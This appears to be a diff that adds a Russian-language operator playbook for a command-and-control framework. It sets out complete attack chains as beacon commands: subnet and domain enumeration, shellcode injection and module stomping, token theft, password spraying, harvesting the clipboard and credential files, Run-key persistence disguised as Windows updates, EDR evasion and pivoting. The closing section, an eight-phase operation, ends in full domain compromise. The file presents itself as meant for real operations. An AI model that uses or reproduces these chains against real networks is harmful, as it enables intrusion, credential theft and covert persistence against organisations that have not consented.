@@ -1,0 +1,177 @@
+Co2H тактические сценарии — полные цепочки атак для реальных операций.
+
+================================================================================
+LATERAL MOVEMENT CHAIN — захват соседних машин
+================================================================================
+
+# 1. Разведка инфраструктуры
+bof stand\build\bof_domain_computers.x64.o     # Список машин в домене
+bof stand\build\bof_network_enum.x64.o 192.168.1  # Сканирование подсети
+
+# 2. Выбор цели для инъекции
+bof stand\build\bof_enum_processes.x64.o       # Детальный список процессов
+# Ищем: GUI процессы (explorer.exe), высокие привилегии, интересных владельцев
+
+# 3. Тестирование доставки
+inject <target_pid> stand\build\sc_msgbox.x64.bin   # Визуальное подтверждение
+inject_apc <gui_pid> stand\build\sc_spin.x64.bin    # APC в GUI процесс
+
+# 4. Модуль stomping для скрытности
+modstomp stand\build\sc_ret.x64.bin C:\Windows\System32\comctl32.dll
+# RIP исполнения внутри легитимного DLL
+
+# 5. Pivot-соединение для непрямых хостов
+tcp_pivot 192.168.1.50 4445    # Через зараженный хост к teamserver
+
+================================================================================
+CREDENTIAL HARVESTING OPERATION — массовый сбор учетных данных
+================================================================================
+
+# 1. Сбор с текущего хоста
+bof stand\build\bof_clipboard.x64.o            # Пароли из clipboard
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Documents\*.txt"
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Desktop\passwords.txt"
+
+# 2. Кража токенов высоких привилегий
+bof stand\build\bof_enum_processes.x64.o       # Найти SYSTEM/admin процессы
+bof stand\build\bof_steal_token.x64.o <system_pid>
+getuid                                          # Проверить новые права
+
+# 3. Password spray на локальные аккаунты
+bof stand\build\bof_password_spray.x64.o       # Атака на administrator/admin
+bof stand\build\bof_password_spray.x64.o localadmin  # Кастомный пользователь
+
+# 4. Использование найденных credentials
+make_token DOMAIN\admin P@ssw0rd123
+shell dir \\fileserver\c$                      # Проверить доступ к файлшарам
+creds add DOMAIN admin password P@ssw0rd123 fileserver "found via spray"
+
+================================================================================
+PERSISTENCE & PRIVILEGE ESCALATION — закрепление с повышением прав
+================================================================================
+
+# 1. Установка persistence
+download C:\Windows\System32\calc.exe C:\temp\update.exe  # Скачать calc как заглушку
+bof stand\build\bof_persistence_run.x64.o install WindowsUpdate C:\temp\update.exe
+
+# 2. Тест persistence (имитация перелогина)
+bof stand\build\bof_persistence_run.x64.o remove WindowsUpdate  # Убрать для теста
+bof stand\build\bof_persistence_run.x64.o install SecurityUpdate C:\temp\legit.exe
+
+# 3. Поиск процессов для privilege escalation
+bof stand\build\bof_enum_processes.x64.o | findstr "High\|System"
+# Ищем процессы под SYSTEM integrity level
+
+# 4. Кража токена для эскалации
+steal_token <system_process_pid>
+getuid                                          # Должен показать SYSTEM
+bof stand\build\bof_whoami.x64.o               # Подтвердить через BOF
+
+================================================================================
+RECONNAISSANCE DEEP DIVE — глубокая разведка среды
+================================================================================
+
+# 1. Сетевая топология
+bof stand\build\bof_netstat.x64.o              # Исходящие соединения
+bof stand\build\bof_domain_computers.x64.o     # Domain controllers, servers
+bof stand\build\bof_network_enum.x64.o 10.0.0  # Internal networks
+
+# 2. Анализ процессов и сервисов
+bof stand\build\bof_enum_processes.x64.o       # Все процессы + владельцы
+# Ищем: AV products, monitoring tools, EDR agents, backup software
+
+# 3. Файловая разведка
+bof stand\build\bof_find_files.x64.o "C:\Program Files*\*\*.config"
+bof stand\build\bof_find_files.x64.o "C:\inetpub\wwwroot\web.config"
+bof stand\build\bof_find_files.x64.o "C:\Users\*\.ssh\*"
+
+# 4. Поиск административных инструментов
+bof stand\build\bof_find_files.x64.o "C:\*\PsExec.exe"
+bof stand\build\bof_find_files.x64.o "C:\*\Sysinternals\*.exe"
+bof stand\build\bof_find_files.x64.o "C:\*\putty.exe"
+
+================================================================================
+INFRASTRUCTURE MAPPING — полное картирование
+================================================================================
+
+# 1. Active Directory структура
+bof stand\build\bof_domain_computers.x64.o     # Все машины домена
+# Анализ: DCs, SQL servers, file servers, workstations
+
+# 2. Network services на каждом хосте
+bof stand\build\bof_network_enum.x64.o 192.168.1
+bof stand\build\bof_network_enum.x64.o 10.0.0
+# Ищем: RDP (3389), SMB (445), WinRM (5985), SQL (1433)
+
+# 3. Текущие сетевые соединения (lateral movement paths)
+bof stand\build\bof_netstat.x64.o | findstr ESTABLISHED
+# Активные соединения показывают trust relationships
+
+# 4. User activity analysis
+bof stand\build\bof_clipboard.x64.o            # Что копирует пользователь
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Documents\*.rdp"  # RDP shortcuts
+
+================================================================================
+EVASION & OPSEC — обход защиты
+================================================================================
+
+# 1. Бесследная доставка payload
+inject_less stand\build\sc_ret.x64.bin         # Threadless injection
+modstomp stand\build\sc_spin.x64.bin           # Execution inside legitimate DLL
+
+# 2. In-process execution (избегаем process creation)
+bof stand\build\bof_netstat.x64.o              # Вместо netstat.exe
+bof stand\build\bof_enum_processes.x64.o       # Вместо tasklist.exe
+execute-assembly C:\Tools\Seatbelt.exe -q      # .NET in-process
+
+# 3. Credential access без записи в filesystem
+bof stand\build\bof_clipboard.x64.o            # Memory-only clipboard read
+bof stand\build\bof_steal_token.x64.o <pid>    # Token theft vs. file-based creds
+
+================================================================================
+COMPLETE OPERATION EXAMPLE — полная операция
+================================================================================
+
+# Initial foothold на workstation
+getuid                                          # Текущий контекст: domain\user
+
+# Phase 1: Local reconnaissance
+bof stand\build\bof_enum_processes.x64.o       # Running processes
+bof stand\build\bof_netstat.x64.o              # Network connections
+bof stand\build\bof_clipboard.x64.o            # User clipboard
+
+# Phase 2: Credential harvesting
+bof stand\build\bof_password_spray.x64.o       # Local accounts
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Documents\*.txt"
+
+# Phase 3: Privilege escalation
+steal_token <high_priv_pid>                     # SYSTEM/admin token
+getuid                                          # Confirm escalation
+
+# Phase 4: Persistence
+bof stand\build\bof_persistence_run.x64.o install ServiceHost C:\temp\update.exe
+
+# Phase 5: Domain reconnaissance
+bof stand\build\bof_domain_computers.x64.o     # Domain infrastructure
+bof stand\build\bof_network_enum.x64.o 192.168.1
+
+# Phase 6: Lateral movement preparation
+# Target: DC at 192.168.1.10 (found in step 5)
+make_token DOMAIN\admin FoundPassword123
+shell dir \\192.168.1.10\c$                   # Test access
+
+# Phase 7: Lateral movement execution
+spawnto stand\build\sc_ret.x64.bin             # Test delivery mechanism
+# Deploy beacon to target via SMB + scheduled task
+
+# Phase 8: Pivot setup for isolated networks
+tcp_pivot 192.168.1.10 4445                   # Route through DC
+
+РЕЗУЛЬТАТ: Complete domain compromise with persistent access and pivot infrastructure.
+
+ЗАМЕЧАНИЯ ПО OPSEC:
+- Все BOF выполняются in-process — нет создания процессов
+- modstomp скрывает execution в legitimate DLL memory
+- inject_less не создает новых потоков
+- Паузы в password spray предотвращают lockout
+- Pivot connections обходят прямую connectivity к C2
